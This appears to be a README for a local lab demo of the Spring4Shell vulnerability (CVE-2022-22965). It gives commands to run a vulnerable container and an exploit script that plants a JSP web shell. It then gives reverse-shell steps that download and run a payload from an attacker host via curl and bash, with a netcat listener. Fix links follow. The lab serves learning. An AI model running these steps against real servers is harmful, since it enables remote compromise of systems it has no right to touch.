# Spring4Shell Demo
CVE-2022-22965
National Vulnerability Database link : https://nvd.nist.gov/vuln/detail/cve-2022-22965

The docker image and exploit program are from reznok's POC repository.

Link: https://github.com/reznok/Spring4Shell-POC


I found this vulnerability searching through YouTube.

Link: https://youtu.be/b5jTYY-MpGo

## Instructions

1. Build and run the container: `docker build . -t spring4shell && docker run -p 8080:8080 spring4shell`
2. Go to: http://localhost:8080/helloworld/greeting
3. Run the exploit.py script: `python exploit.py --url "http://localhost:8080/helloworld/greeting"`
4. Modify the `cmd` GET parameter for your commands. (`http://localhost:8080/shell.jsp` by default)

### Examples commands
-id
-whoami
-ls
-pwd

## Reverse Shell Video 
Link: https://youtu.be/aWxG66BXlqU
1. Change IP in reveshell file to your IP
2. Start python server: `sudo python3 -m http.server 80`
3. Launch Burp and send request to Repeater
4. Replace command with `curl 192.168.186.85/revshell.sh -o revshell.sh` in the request(change IP to your attack IP)
5. Select command and encode with URL encoding
6. Repeat with `bash revshell.sh`
7. Create listener: `nc -lvo 4444`

## Fixes
https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement#disallowed-fields
https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15


## Sources
https://docs.spring.io/spring-framework/docs/3.0.0.M4/reference/html/ch01s02.html
https://www.javatpoint.com/spring-mvc-tutorial
https://www.tenable.com/blog/spring4shell-faq-spring-framework-remote-code-execution-vulnerability






